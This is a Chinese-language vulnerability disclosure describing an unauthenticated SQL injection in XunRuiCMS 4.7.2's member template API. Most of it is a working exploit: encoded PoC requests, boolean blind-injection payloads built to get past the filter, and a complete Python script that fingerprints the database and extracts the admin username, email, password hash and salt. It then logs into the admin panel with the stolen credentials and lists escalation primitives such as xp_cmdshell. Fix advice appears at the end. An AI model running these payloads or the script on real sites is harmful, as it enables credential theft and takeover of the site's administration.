# VulDB 提交 — 迅睿CMS 会员模板接口未授权 SQL 注入（后台账号凭据泄露，可链式获取 RCE）

**厂商：** 迅睿CMS（四川迅睿云软件开发有限公司）

**产品：** XunRuiCMS / XunRuiPHP（基于 CodeIgniter 4 的内容管理系统）

**版本：** 4.7.2（在 4.7.2 验证；并在独立 Linux/Docker 部署上复现：Apache 2.4.54、PHP 7.4.33、MySQL 8.0.46）

**类型：** CWE-89（SQL 命令中特殊元素中和不当）—— **未授权（前置）SQL 注入**；可读取数据库任意数据，并泄露后台账号口令哈希

---

## 描述

**概述**

前台会员接口控制器 `dayrui/App/Member/Controllers/Api.php::template()`（`template()` 位于第 263 行）在**没有任何鉴权**的情况下，把**全部请求参数当作模板变量**渲染指定模板：

```php
public function template() {
    $app    = dr_safe_filename(\Phpcmf\Service::L('input')->get('app'));
    $file   = dr_safe_filename(\Phpcmf\Service::L('input')->get('name'));
    $module = dr_safe_filename(\Phpcmf\Service::L('input')->get('module'));
    ...
    \Phpcmf\Service::V()->assign(\Phpcmf\Service::L('input')->get('', true));   // 全部 GET 参数变成模板变量
    \Phpcmf\Service::V()->display($file);
```

自带模板 `list.html` 用未校验的 `$catid` 调用列表标签：

```
{list action=module catid=$catid page=1}
```

于是 `$catid` 作为标签参数串的一部分进入 `View::list_tag()`（`dayrui/Fcms/Core/View.php:962`）。`list_tag()` 用正则抓取 `where` 属性并**原样拼接**进 SQL（`View.php:1008`）：

```php
if (preg_match('/where=\'(.+)\'/sU', $_params, $match)) {
    $where = $match[1];       // 模块 Action 构造 SQL 时直接使用
}
```

由于 `catid` 从未被强制转成整型，且 `module`/`where` 未被剥离，未授权攻击者可完全控制 `WHERE` 子句：

```
GET /index.php?s=member&c=api&m=template&name=list.html&catid=201 module=news where='<SQL>'
```

核心目录下的加固版孪生实现（`dayrui/Fcms/Control/Api/Api.php`，`template()` 位于第 368 行）做了整型转换并清理了标签参数；而 App 目录这份没有——这正是漏洞存在于发行版应用代码中的原因。

**注入存在性验证（排除长度差异等伪因）**

| 测试 | 请求（`where` 片段） | 结果 | 目的 |
|---|---|---|---|
| 基线 | `201 module=news`（不注入） | HTTP 200 / 34939 字节 | 正常列表 |
| 恒真 / 恒假 | `1=1` / `1=0` | 34730 / 2033 | 布尔差异 |
| **同长度对照** | `1=1 AND 1=1` 与 `1=1 AND 1=2`（均 11 字符，各重复 3 次） | 34730 / 2033（稳定） | 排除长度/字符串差异 |
| 标量子查询 | `(SELECT 1)=1` 与 `(SELECT 2)=1` | TRUE / FALSE | 子查询确实被求值 |
| **未知列** | `1=1 AND nosuchcolumn_zz=1` | **HTTP 500**（合法表达式 200） | 文本被数据库当 SQL 解析 |
| 真实数据判定 | `SUBSTRING((SELECT username FROM dr_member WHERE id=1),1,1)=0x61` | TRUE；`0x62` → FALSE | 可读取真实数据 |

接口不回显 SQL 错误（500 为通用错误页），因此采用**布尔盲注**：以响应 `Content-Length` 作为判定。注意输入过滤会同时破坏 `>` 字符和 `LENGTH` 关键字（`CHAR_LENGTH` 因包含 `LENGTH` 同样受影响），因此所有比较均写成 `SIGN(a-b)=1`，不使用 `LENGTH()`（值长度用存在性探测 `SIGN(ASCII(SUBSTRING(...))-31)=1` 获得）。

**从数据库提取到的数据（二分盲注）**

| 目标 | 值 |
|---|---|
| `version()` / `database()` | `8.0.46` / `xunruicms` |
| `username`（`dr_member.id=1`） | `admin` |
| `email` | `admin@admin.com` |
| `password`（库中哈希） | `c67356deed081cca376fe8ec4fa0bf7b` |
| `salt` | `01b7cd4dc6` |

自校验：已知 `md5('admin') = 21232f297a57a5a743894a0e4a801fc3`，按框架算法 `md5(md5(pass).salt.md5(pass))` 计算得 `md5('21232f297a57a5a743894a0e4a801fc3' + '01b7cd4dc6' + '21232f297a57a5a743894a0e4a801fc3') = c67356deed081cca376fe8ec4fa0bf7b`，与提取到的哈希**逐字节一致**，证明提取准确。（口令一旦修改，库中哈希与 salt 会重新生成；注入可随时重跑再次提取。）

**影响**

任意匿名访问者可读取数据库中的任意数据（配置、会员、订单、留言内容等），尤其是后台账号的 MD5 口令哈希与 salt，可离线爆破或（如实测）直接反推。取得的凭据可完整接管后台（管理员会话），**前提是已知或可获取安装器随机生成的后台入口文件名**；该随机命名提高了立即登录的门槛，但对凭据泄露本身不构成防护。被泄露的数据涵盖站点配置、会员数据以及 CMS 中存储的全部业务数据。

环境说明：测试部署的数据库账号无 `FILE` 权限、且数据库位于**独立容器**，因此 `SELECT … INTO OUTFILE` 无法落 Web shell（实测 `SQLSTATE[42000] 1227 Access denied; you need … FILE privilege`）。写文件型利用取决于环境，而读数据型利用（凭据窃取）不受影响。

**验证过程（PoC）**

第 1 步 —— 布尔判定（未授权）：

```
GET /index.php?s=member&c=api&m=template&name=list.html&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%201%3D1%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 200 OK   Content-Length: 34730        （TRUE）

GET …&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%201%3D2%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 200 OK   Content-Length: 2033         （FALSE）
```

第 2 步 —— 确认片段被数据库执行：

```
GET …&catid=201%20module%3Dnews%20where%3D%271%3D1%20AND%20nosuchcolumn_zz%3D1%27 HTTP/1.1
Host: <target>
-> HTTP/1.1 500 Internal Server Error
```

第 3 步 —— 盲注提取（逐字符二分，约 7 请求/字符）：

```
条件:   1=1 AND SIGN(ASCII(SUBSTRING((SELECT <column> FROM dr_member WHERE id=1),<pos>,1))-<mid>)=1
结果:   username = admin
        email    = admin@admin.com
        password = c67356deed081cca376fe8ec4fa0bf7b
        salt     = 01b7cd4dc6
```

上面的片段是本靶场（`MySQL 8.0.46`）所用的 MySQL 方言；其他驱动的等价写法（SQLite3 的 `UNICODE`/`SUBSTR`，Postgre 与 SQLSRV 的 `ASCII`/`SUBSTRING`）以及自动识别驱动的实现，见下文“跨数据库适配”一节。

第 4 步 —— 用取得的凭据登录后台：

```
POST /<entry>.php?c=login&m=index HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Content-Length: 93

data[username]=admin&data[password]=21232f297a57a5a743894a0e4a801fc3&data[mode]=1
-> {"code":1,"msg":"ok","data":{"url":"admin82b8542a912e.php?time=…"}}
```

后台入口文件由安装器**随机命名**（本靶场为 `admin82b8542a912e.php`），默认的 `admin.php` 通常已被删除，请使用真实入口名。（SQL 注入本身无需登录，与本步骤无关；此步仅说明窃取到的凭据能做什么。）

**跨数据库适配（MySQLi / SQLite3 / Postgre / SQLSRV）**

该漏洞与具体数据库无关：CMS 内置 MySQL/MariaDB（`MySQLi`）、`SQLite3`、`Postgre`、`SQLSRV` 四种驱动（`dayrui/CodeIgniter72/System/Database/*`、`dayrui/Fcms/Control/Install.php`），且各驱动的表结构由同一份 PHP 字段定义生成（`dayrui/Fcms/Config/Install.php`），因此本文用到的表/字段名（`dr_member.username / email / password / salt`）在四种驱动下完全一致，需要适配的只是 **payload 的 SQL 方言**。

凭据存储同样在 PHP 侧：无论哪种驱动，`password` 都存 `md5(md5(pass).salt.md5(pass))`、`salt` 存随机盐，因此提取到的哈希/salt 组合在任何 DBMS 下均可直接使用（或离线破解）。

PHP 层强加给 payload 的限制（与驱动无关）：

| 限制 | 原因 | 对 payload 的影响 |
|---|---|---|
| 不能出现内层 `'`、`"` | `View::list_tag()` 用 `/where='(.+)'/sU` 截取片段，第一个内层引号即终止截取 | 不能用字符串字面量，改用数字字面量（`0x61`、`97`） |
| `<`、`>`、`;` 无法穿透 | 原始请求数组经 `Input::get('', true)` → `xss_clean()` 赋给模板变量时被处理（三者均导致 SQL 报错） | 禁用 `<`/`>`/`;`，比较一律用 `BETWEEN`（或 `SIGN(a-b)=1`） |
| `--`、`/* … */` 可穿透 | 未被过滤 | 可用 |
| 无法堆叠语句 | `;` 被破坏，且 CI4 逐条发送语句 | 下表中的驱动级写文件/命令执行原语在本向量上不可达 |

各驱动的片段（PHP 侧 payload 形态完全相同）：

| 驱动 | 探测子（仅在该驱动返回 TRUE） | 取字符码 | 取子串 | 取长度 |
|---|---|---|---|---|
| MySQLi（MySQL/MariaDB） | `1=1 AND @@version_comment=@@version_comment` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LENGTH(x)` |
| SQLite3 | `1=1 AND sqlite_version()=sqlite_version()` | `UNICODE(x)` | `SUBSTR(x,i,1)` | `LENGTH(x)` |
| Postgre | `1=1 AND current_database()=current_database()` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LENGTH(x)` |
| SQLSRV | `1=1 AND DB_NAME()=DB_NAME()` | `ASCII(x)` | `SUBSTRING(x,i,1)` | `LEN(x)` |

下列脚本采用通用比较 `expr BETWEEN m+1 AND 126`（等价于严格大于，但不出现 `>` 字符），并用存在性探测 `expr BETWEEN 1 AND 126`（越界时 `ascii()`/`unicode()` 返回 `0`/`NULL`，均为假），因此不依赖任何驱动的长度函数。

验证矩阵：

| 驱动 | 验证方式 | 结果 |
|---|---|---|
| MySQLi | 在靶场通过真实 HTTP 验证（`MySQL 8.0.46`） | `driver = MySQLi`，四个字段均提取成功 |
| SQLite3 | 用同一谓词、同一算法在本地 SQLite 引擎上直接执行（同一行数据） | 提取到完全相同的值 |
| Postgre / SQLSRV | 仅做方言映射（片段均为标准 SQL），未在本靶场执行 | 未执行 |

驱动相关的提权（仅作背景：本向量为**只读**，上述原语均不可达）：MySQL `INTO OUTFILE`（需 `FILE`，本环境已禁用）、PostgreSQL `COPY … TO PROGRAM`（需超级用户）、SQL Server `xp_cmdshell`（需 `sysadmin`）、SQLite 无文件写入原语。无论哪种驱动，已经确认的影响都是**全量数据读取**（即凭据窃取），足以接管后台（见第 4 步）。

**PoC 脚本（`3.py`）**

```
python 3.py http://<target>
```

```python
import sys, requests

b = sys.argv[1].rstrip("/")
u = b + "/index.php?s=member&c=api&m=template&name=list.html&catid=201 module=news where='"
s = requests.Session()

DBS = {
    "MySQLi":  ("1=1 AND @@version_comment=@@version_comment", "ASCII(SUBSTRING({},%d,1))"),
    "SQLite3": ("1=1 AND sqlite_version()=sqlite_version()", "UNICODE(SUBSTR({},%d,1))"),
    "Postgre": ("1=1 AND current_database()=current_database()", "ASCII(SUBSTRING({},%d,1))"),
    "SQLSRV":  ("1=1 AND DB_NAME()=DB_NAME()", "ASCII(SUBSTRING({},%d,1))"),
}


def t(x):
    return len(s.get(u + x + "'", timeout=25).text) > 20000


db = "?"
for k in ("MySQLi", "SQLite3", "Postgre", "SQLSRV"):
    if t(DBS[k][0]):
        db = k
        break
print("driver =", db, flush=True)
if db == "?":
    sys.exit(1)
c = DBS[db][1]


def q(sql):
    v = c.format("(" + sql + ")")
    r = ""
    for i in range(1, 65):
        e = v % i
        if not t("1=1 AND %s BETWEEN 1 AND 126" % e):
            break
        a, z = 32, 126
        while a < z:
            m = (a + z) // 2
            if t("1=1 AND %s BETWEEN %d AND 126" % (e, m + 1)):
                a = m + 1
            else:
                z = m
        r += chr(a)
    return r


print("TRUE ", t("1=1 AND 1=1"))
print("FALSE", t("1=1 AND 1=2"))
print("UNKNOWN-COLUMN HTTP", s.get(u + "1=1 AND nosuchcolumn_zz=1'").status_code)

for f in ("username", "email", "password", "salt"):
    print("%-8s =" % f, q("SELECT %s FROM dr_member WHERE id=1" % f), flush=True)
```

**修复建议**

1. 凡来自请求参数的标识符（如 `catid`）在使用前强制转成整型；并从模板变量中剥离 `module`、`where`、`order`、`action` 等标签属性——**匿名控制器绝不能把原始请求数组整体 `View::assign()`**。
2. `View::list_tag()` 应结构化解析标签参数，把 `where` 片段交给查询构造器/参数绑定，而不是字符串拼接进 SQL。
3. 应用层 `Api` 控制器需与核心加固实现（`Fcms/Control/Api/Api.php` 已做整型转换）保持一致。
4. 不要暴露可用于区分错误的调试/500 页面；对大量同构列表请求做监控（盲注指纹）。
5. 数据库账号最小权限（无 `FILE`、无 `DROP`），即使 `secure_file_priv` 允许写文件，SQL 注入也无法落文件。
6. 修复与驱动无关：不要依赖驱动层转义（`escape()`/`escapeLikeString()`），而应绑定或直接拒绝 `where` 片段，并对四种受支持驱动统一加固标签解析（`catid` 强制整型）。
